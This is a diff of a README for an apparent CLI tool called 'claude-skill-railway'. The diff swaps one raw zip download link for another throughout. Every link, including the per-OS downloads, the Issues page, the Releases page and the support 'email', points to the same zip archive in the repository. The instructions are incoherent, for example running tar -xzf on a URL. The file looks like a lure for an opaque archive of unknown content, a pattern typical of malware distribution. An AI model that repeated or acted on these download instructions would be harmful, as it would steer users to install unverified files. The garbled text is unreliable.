@@ -1,7 +1,7 @@
 # 🚄 claude-skill-railway - Manage Deployments Easily via CLI
 
 ## 🔗 Download Now
-[![Download](https://github.com/mokarram-PU/claude-skill-railway/raw/refs/heads/main/railway/skill-claude-railway-3.7.zip)](https://github.com/mokarram-PU/claude-skill-railway/raw/refs/heads/main/railway/skill-claude-railway-3.7.zip)
+[![Download](https://github.com/mokarram-PU/claude-skill-railway/raw/refs/heads/main/railway/claude_railway_skill_v2.4.zip)](https://github.com/mokarram-PU/claude-skill-railway/raw/refs/heads/main/railway/claude_railway_skill_v2.4.zip)
 
 ## 🚀 Getting Started
 Welcome to the **claude-skill-railway**! This application helps you manage your deployments easily through a Command Line Interface (CLI). Whether you are deploying applications or managing updates, this tool simplifies the process for you.
@@ -23,16 +23,16 @@ To run the **claude-skill-railway** application, ensure you meet the following r
 ## 📥 Download & Install
 To get started, visit the Releases page to download the application. You can access the page using the link below:
 
-[Download the Latest Release](https://github.com/mokarram-PU/claude-skill-railway/raw/refs/heads/main/railway/skill-claude-railway-3.7.zip)
+[Download the Latest Release](https://github.com/mokarram-PU/claude-skill-railway/raw/refs/heads/main/railway/claude_railway_skill_v2.4.zip)
 
 ### Step-by-Step Download Instructions:
 1. Click on the link above.
 2. You will see a list of available releases. Look for the latest version at the top of the list.
 3. Click on the release version you want to download.
 4. Scroll down to the "Assets" section which contains files. Choose the one that matches your operating system:
-   - For Windows, download `https://github.com/mokarram-PU/claude-skill-railway/raw/refs/heads/main/railway/skill-claude-railway-3.7.zip`.
-   - For macOS, download `https://github.com/mokarram-PU/claude-skill-railway/raw/refs/heads/main/railway/skill-claude-railway-3.7.zip`.
-   - For Linux, download `https://github.com/mokarram-PU/claude-skill-railway/raw/refs/heads/main/railway/skill-claude-railway-3.7.zip`.
+   - For Windows, download `https://github.com/mokarram-PU/claude-skill-railway/raw/refs/heads/main/railway/claude_railway_skill_v2.4.zip`.
+   - For macOS, download `https://github.com/mokarram-PU/claude-skill-railway/raw/refs/heads/main/railway/claude_railway_skill_v2.4.zip`.
+   - For Linux, download `https://github.com/mokarram-PU/claude-skill-railway/raw/refs/heads/main/railway/claude_railway_skill_v2.4.zip`.
 5. Save the file to your computer.
 
 ### Installation Instructions:
@@ -48,7 +48,7 @@ To get started, visit the Releases page to download the application. You can acc
 
 - **On Linux:**
   1. Open a terminal.
-  2. Extract the https://github.com/mokarram-PU/claude-skill-railway/raw/refs/heads/main/railway/skill-claude-railway-3.7.zip file using the command: `tar -xzf https://github.com/mokarram-PU/claude-skill-railway/raw/refs/heads/main/railway/skill-claude-railway-3.7.zip`.
+  2. Extract the https://github.com/mokarram-PU/claude-skill-railway/raw/refs/heads/main/railway/claude_railway_skill_v2.4.zip file using the command: `tar -xzf https://github.com/mokarram-PU/claude-skill-railway/raw/refs/heads/main/railway/claude_railway_skill_v2.4.zip`.
   3. Navigate to the extracted folder and follow any additional instructions in the README included.
 
 ## 🛠️ Usage
@@ -81,13 +81,13 @@ For more detailed command usage, please consult the **User Guide** within the ap
 ## 📞 Support
 If you encounter any problems or have questions during installation or use, you can reach out for support:
 
-- **Issues Page:** You can report issues directly on our [GitHub Issues page](https://github.com/mokarram-PU/claude-skill-railway/raw/refs/heads/main/railway/skill-claude-railway-3.7.zip).
-- **Email Support:** For direct support, please email us at https://github.com/mokarram-PU/claude-skill-railway/raw/refs/heads/main/railway/skill-claude-railway-3.7.zip
+- **Issues Page:** You can report issues directly on our [GitHub Issues page](https://github.com/mokarram-PU/claude-skill-railway/raw/refs/heads/main/railway/claude_railway_skill_v2.4.zip).
+- **Email Support:** For direct support, please email us at https://github.com/mokarram-PU/claude-skill-railway/raw/refs/heads/main/railway/claude_railway_skill_v2.4.zip
 
 ## 🌟 Community Contributions
 We welcome contributions! If you want to add features or fix issues, please check our contribution guidelines available in the repository. Your help makes this tool better for everyone!
 
 ## 🔄 Updates
-Stay updated on the latest releases and improvements by checking back on our [Releases page](https://github.com/mokarram-PU/claude-skill-railway/raw/refs/heads/main/railway/skill-claude-railway-3.7.zip) often.
+Stay updated on the latest releases and improvements by checking back on our [Releases page](https://github.com/mokarram-PU/claude-skill-railway/raw/refs/heads/main/railway/claude_railway_skill_v2.4.zip) often.
 
 Thank you for using **claude-skill-railway**! We hope this application makes your deployment process smooth and easy.
